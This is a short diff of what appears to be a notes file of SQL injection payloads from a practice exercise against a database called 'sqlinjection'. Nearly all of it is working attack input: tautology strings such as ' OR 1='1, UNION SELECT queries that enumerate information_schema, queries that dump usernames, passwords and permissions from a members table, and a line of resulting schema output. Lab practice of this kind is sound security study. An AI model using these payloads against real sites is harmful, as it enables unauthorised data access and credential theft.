@@ -1,5 +1,4 @@
 ?category=1 OR 1=1
-UNION SELECT table_schema,table_name,column_name FROM information_schema.columns WHERE table_schema = 'sqlinjection'
 UNION SELECT DISTINCT table_name,2,3 FROM information_schema.columns WHERE table_schema = 'sqlinjection'
 UNION SELECT username,password,permission FROM sqlinjection.members
 ' OR 1='1
@@ -9,6 +8,8 @@ UNION SELECT data,2,3 FROM sqlinjection.share4 <----------- DECODE FROM BASE64
 
 
 
+UNION SELECT table_schema,table_name,column_name FROM information_schema.columns WHERE table_schema = 'sqlinjection'
+----------------------------------------------------
 sqlinjection	categories	      id
 sqlinjection	categories	      name
 sqlinjection	categories	      description
